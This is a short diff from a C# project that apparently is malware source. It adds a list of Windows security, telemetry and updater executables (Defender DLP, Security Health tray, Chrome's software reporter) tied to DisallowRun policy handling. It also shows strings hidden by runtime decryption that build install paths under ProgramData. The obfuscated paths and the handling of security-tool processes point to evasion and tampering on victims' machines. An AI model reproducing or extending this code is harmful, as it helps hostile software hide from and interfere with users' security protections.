@@ -274,6 +274,18 @@ namespace DBase
                 "f9729781-9d66-46b8-8553-f0099fd924d3",
                 "f9b3908f-4f58-45ec-a9a8-c1b88e9dbe98",
             };
+
+        public List<string> DisallowRunIgnoreList = new List<string>()
+        {
+            "CompatTelRunner.exe",
+            "DeviceCensus.exe",
+            "MpDlpCmd.exe",
+            "upfc.exe",
+            "software_reporter_tool.exe",
+            "SecurityHealthSystray.exe",
+            "MicrosoftEdgeUpdate.exe"
+        };
+
 		//@"\\?\"
         public List<string> obfStr1 = new List<string>() {
         @"\\?\" + Drive.Letter + Bfs.Create("B76qv4Y6UijDATqmW5wZvWiPkRXU5+QAKveDA879Ius=","Q/4BZfwG/pmhlcnM8hsXdZ0EJgIpqp9Hypft/H4wAow=", "3z/uO57iDOPpAh0oNN4wqQ=="), //:\ProgramData\Install
